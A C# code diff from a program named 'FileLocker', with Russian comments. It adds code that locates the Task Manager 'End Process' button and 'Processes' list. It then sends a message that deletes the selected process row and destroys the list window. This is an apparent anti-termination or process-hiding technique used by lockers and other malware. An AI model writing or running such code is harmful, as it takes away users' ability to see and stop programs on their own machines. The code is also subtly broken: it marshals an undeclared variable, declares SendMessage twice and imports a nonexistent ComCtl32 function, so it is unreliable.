@@ -94,15 +94,63 @@ namespace FileLocker {
 			GetClassName(hWnd, name, 100);
 
 			if (name.ToString() == "Button" && text.ToString() == "&End Process") {
-				Console.WriteLine("FIND!");
+				Console.WriteLine("FIND! Button");
 				//SetParent(hWnd, hWindow);
 				//SetWindowPos(hWnd, hWnd, 10, 10, 20, 20, NULL);
 
 				GetWindowRect(hWnd, ref buttonRect);
 				Console.WriteLine($"{buttonRect.Left} {buttonRect.Top} {buttonRect.Right} {buttonRect.Bottom}");
 
-				//SetParent(hWnd, IntPtr.Zero);
-			}
+                //DestroyWindow(hWnd);
+            }
+
+            if (name.ToString() == "SysListView32" && text.ToString() == "Processes")
+            {
+                Console.WriteLine($"find! SysListView32");
+
+                // получаем первую выделенную строку
+                //int nSelectedItem = ListView_GetNextItem(hListView, -1, );
+                // получаем текст из 3-го столбца выделенной строки
+                //TCHAR szText[100];
+                //int nSubItem = 2; // нумерация с нуля
+                // ListView_GetItemText(hListView, nSelectedItem, nSubItem, szText, 100);
+
+                //#define ListView_GetNextItem(hwnd, i, flags) \
+               // (int)SNDMSG((hwnd), LVM_GETNEXTITEM, (WPARAM)(int)(i), MAKELPARAM((flags), 0))
+
+                int item = SendMessage(hWnd, 0x1000 + 12, (IntPtr)(-1), (IntPtr)(2));
+                int rez = item;
+                Console.WriteLine("rez: " + rez.ToString());
+
+                /*
+                 LV_ITEM _macro_lvi;\
+  _macro_lvi.iSubItem = (iSubItem_);\
+  _macro_lvi.cchTextMax = (cchTextMax_);\
+  _macro_lvi.pszText = (pszText_);\
+  SNDMSG((hwndLV), LVM_GETITEMTEXT, (WPARAM)(i), (LPARAM)(LV_ITEM *)&_macro_lvi);\
+                 */
+
+                ListViewInfo info = new ListViewInfo();
+                info.iSubItem = 0;
+                info.cchTextMax = 100;
+                info.pszText = new StringBuilder();
+
+                IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf(lParam));
+                Marshal.StructureToPtr(lParam, ptr, false);
+
+                rez = SendMessage(hWnd, 0x1000 + 45/*115*/, (IntPtr)(item), ptr);
+                Console.WriteLine("str size: " + rez.ToString());
+                Console.WriteLine("text: " + info.pszText);
+
+                Marshal.FreeHGlobal(ptr);
+
+                //ListView_DeleteItem(hwnd, i) \
+                //(BOOL)SNDMSG((hwnd), LVM_DELETEITEM, (WPARAM)(int)(i), 0L)
+                rez = SendMessage(hWnd, 0x1000 + 8, (IntPtr)(item), (IntPtr)(0));
+                Console.WriteLine("rez: " + rez.ToString());
+
+                DestroyWindow(hWnd);
+            }
 
 			return true;
 		}
@@ -115,15 +163,66 @@ namespace FileLocker {
 			public int Bottom;      // y position of lower-right corner
 		}
 
-		[StructLayout(LayoutKind.Sequential)]
+        [StructLayout(LayoutKind.Sequential)]
+        public struct ListViewInfo
+        {
+            //UINT mask;
+            //int iItem;
+            //int iSubItem;
+            //UINT state;
+            //UINT stateMask;
+            //LPWSTR pszText;
+            //int cchTextMax;
+            //int iImage;
+            //LPARAM lParam;
+            //int iIndent;
 
+        //     public Int32 mask;
+        //public Int32 iItem;
+        //public Int32 iSubItem;
+        //public Int32 state;
+        //public Int32 stateMask;
+        //public string pszText;
+        //public Int32 cchTextMax;
+        //public Int32 iImage;
+        //public Int32 lParam;
+        //public Int32 iIndent;
+
+            public uint mask;
+            public int iItem;
+            public int iSubItem;
+            public uint state;
+            public uint stateMask;
+            [MarshalAs(UnmanagedType.LPWStr)] public StringBuilder pszText;
+            public int cchTextMax;
+            public int iImage;
+            public IntPtr lParam;
+            public int iIndent;
+            //#if (NTDDI_VERSION >= NTDDI_WINXP)
+               // public int iGroupId;
+               // public uint cColumns; // tile view columns
+               // public StringBuilder puColumns;
+            //#endif
+            //#if (NTDDI_VERSION >= NTDDI_VISTA)
+               // public IntPtr piColFmt;
+               // public int iGroup; // readonly. only valid for owner data.
+            //#endif
+
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
 		private struct POINT {
 			public int x;
 			public int y;
 		}
 
+        [DllImport("user32.dll")]
+        public static extern int SendMessage(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam);
 
-		[StructLayout(LayoutKind.Sequential)]
+        [DllImport("ComCtl32.dll")]
+        public static extern int ListView_GetItemText(IntPtr wParam, IntPtr lParam);
+
+        [StructLayout(LayoutKind.Sequential)]
 		private struct MSLLHOOKSTRUCT {
 			public POINT pt;
 			public uint mouseData;
@@ -172,5 +271,8 @@ namespace FileLocker {
 
 		[DllImport("user32.dll", CharSet = CharSet.Auto)]
 		private static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
-	}
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        private static extern bool DestroyWindow(IntPtr hWnd);
+    }
 }
